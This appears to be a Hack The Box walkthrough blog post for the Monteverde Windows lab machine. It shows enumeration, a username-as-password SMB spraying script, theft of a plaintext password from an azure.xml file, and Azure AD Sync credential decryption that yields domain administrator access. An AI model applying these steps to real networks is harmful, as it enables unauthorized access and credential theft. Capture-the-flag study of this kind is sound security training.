---
layout: post
title:  Monteverde
categories: hackthebox
tags: [hackthebox, windows, medium, enum4linux, Active Directory, Azure, VbScrub, egre55]
lang: "en"
image:
    path: assets/images/hackthebox/monteverde/preview.webp
    width: 300
    height: 300
...

![Monteverde](../../../../assets/images/hackthebox/monteverde/monteverde.jpg)

# abstract

Monteverde is a Windows machine from [@egre55](https://twitter.com/egre55). To master the machine some enumeration is necessary. 
Using a username as a password is fatal here. The fact that files that contain access data become accessible shows how important it is never to store passwords in clear text. 

Once the password has been found, you can log in directly to the machine. There we find out that we have permissions for Azure and after some research we have the possibility to decrypt the login data and log in as administrator.

# enumeration

## nmap

As always I start a nmap scan first.

```bash
# Nmap 7.80 scan initiated Fri Feb 21 18:49:49 2020 as: nmap -sC -sT -sV -oA monteverde.nmap monteverde.htb
Nmap scan report for monteverde.htb (10.10.10.172)
Host is up (0.037s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-22 00:00:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/21%Time=5E506CAE%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10m14s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-22T00:02:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 21 18:54:28 2020 -- 1 IP address (1 host up) scanned in 279.12 seconds
```

NMAP provides some open ports, since this is a Windows machine we should check with enum4linux if we get more information.

## enum4linux

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar  7 15:08:24 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... monteverde.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on monteverde.htb    |
 ====================================================== 
[E] Can't find workgroup/domain


 ============================================== 
|    Nbtstat Information for monteverde.htb    |
 ============================================== 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ======================================= 
|    Session Check on monteverde.htb    |
 ======================================= 
[+] Server monteverde.htb allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 ============================================= 
|    Getting domain SID for monteverde.htb    |
 ============================================= 
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ======================================== 
|    OS information on monteverde.htb    |
 ======================================== 
[+] Got OS info for monteverde.htb from smbclient: 
[+] Got OS info for monteverde.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 =============================== 
|    Users on monteverde.htb    |
 =============================== 
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 =========================================== 
|    Share Enumeration on monteverde.htb    |
 =========================================== 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on monteverde.htb

 ====================================================== 
|    Password Policy Information for monteverde.htb    |
 ====================================================== 


[+] Attaching to monteverde.htb using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] MEGABANK
	[+] Builtin

[+] Password Info for Domain: MEGABANK

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: 41 days 23 hours 53 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ================================ 
|    Groups on monteverde.htb    |
 ================================ 

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan

 ========================================================================= 
|    Users on monteverde.htb via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =============================================== 
|    Getting printer info for monteverde.htb    |
 =============================================== 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Mar  7 15:09:35 2020
```

Enum4Linux provides some usernames, but no default passwords or other useful information.

## user enumeration over netBIOS

If you don't have enum4linux at hand at the moment, you can also use the rpcclient to quickly determine the users.

```bash
kali@kali:~/hacking_stuff/htb/machines/monteverde$ rpcclient -U '' -N 10.10.10.172
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

## SMB enumeration

Since I did not find any passwords, I try to use the usernames as passwords for now.

```bash
# User array
array=( Administrator AAD_987d7f2f57d2 mhope SABatchJobs svc-ata svc-bexec svc-netapp dgalanos roleary smorgan )
for user in "${array[@]}"
do
	echo "check $user"
    # try to login with the same username as password
	smbclient -U $user%$user -W MEGABANK -L //monteverde.htb/
done
```

```bash
kali@kali:~/hacking_stuff/htb/machines/monteverde$ ./script.sh 
check Administrator
session setup failed: NT_STATUS_LOGON_FAILURE
check AAD_987d7f2f57d2
session setup failed: NT_STATUS_LOGON_FAILURE
check mhope
session setup failed: NT_STATUS_LOGON_FAILURE
check SABatchJobs

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
SMB1 disabled -- no workgroup available
check svc-ata
session setup failed: NT_STATUS_LOGON_FAILURE
check svc-bexec
session setup failed: NT_STATUS_LOGON_FAILURE
check svc-netapp
session setup failed: NT_STATUS_LOGON_FAILURE
check dgalanos
session setup failed: NT_STATUS_LOGON_FAILURE
check roleary
session setup failed: NT_STATUS_LOGON_FAILURE
check smorgan
session setup failed: NT_STATUS_LOGON_FAILURE
```

The user SABatchJobs can successfully log on to the SMB server.
So let's enumerate a bit further.

```bash
kali@kali:~/hacking_stuff/htb/machines/monteverde$ smbclient -U SABatchJobs%SABatchJobs -W MEGABANK //monteverde.htb/users$
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

\dgalanos
  .                                   D        0  Fri Jan  3 08:12:30 2020
  ..                                  D        0  Fri Jan  3 08:12:30 2020

\mhope
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

\roleary
  .                                   D        0  Fri Jan  3 08:10:30 2020
  ..                                  D        0  Fri Jan  3 08:10:30 2020

\smorgan
  .                                   D        0  Fri Jan  3 08:10:24 2020
  ..                                  D        0  Fri Jan  3 08:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \> cd mhope
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
```

A very juicy file appears.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

# user flag

Try to login as mhope with the given password over winrm.

```powershell
kali@kali:~$ evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> dir


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
4961976bd7d8--------------------
```

Hurray, user owned! Now move on to admin account.

# privilege escalation

At first check who you are and what permissions you got.

```powershell
*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Ok, we are member of the Azure Admins group.

After a while of research I found a very useful [article](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) from [VbScrub](https://twitter.com/vbscrub).

The article links to other sources and also to the original source code written in Python. Since the server has no Python installed, I was very grateful for the compiled code from VbScrub.

The first step is to upload the .exe and .dll to the machine. 

Fortunately, evil-winrm offers a direct way to upload the files.

```powershell
*Evil-WinRM* PS C:\Users\mhope\Downloads> upload AdDecrypt.exe C:\Users\mhope\Downloads\AdDecrypt.exe
Info: Uploading AdDecrypt.exe to C:\Users\mhope\Downloads\AdDecrypt.exe

                                                             
Data: 19796 bytes of 19796 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\mhope\Downloads> upload mcrypt.dll C:\Users\mhope\Downloads\mcrypt.dll
Info: Uploading mcrypt.dll to C:\Users\mhope\Downloads\mcrypt.dll

                                                             
Data: 445664 bytes of 445664 bytes copied

Info: Upload successful!
```

The next step is to change to the program directory of Microsoft Azure AD Sync and start the decryptor from there.

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Downloads\AdDecrypt.exe -fullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

Nice one, the credentials of the administrator.

# root flag

```powershell
kali@kali:~$ evil-winrm -i monteverde.htb -u Administrator -p d0m@in4dminyeah!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
12909612d25c--------------------
```

Very nice and straightforward machine, I really enjoyed it.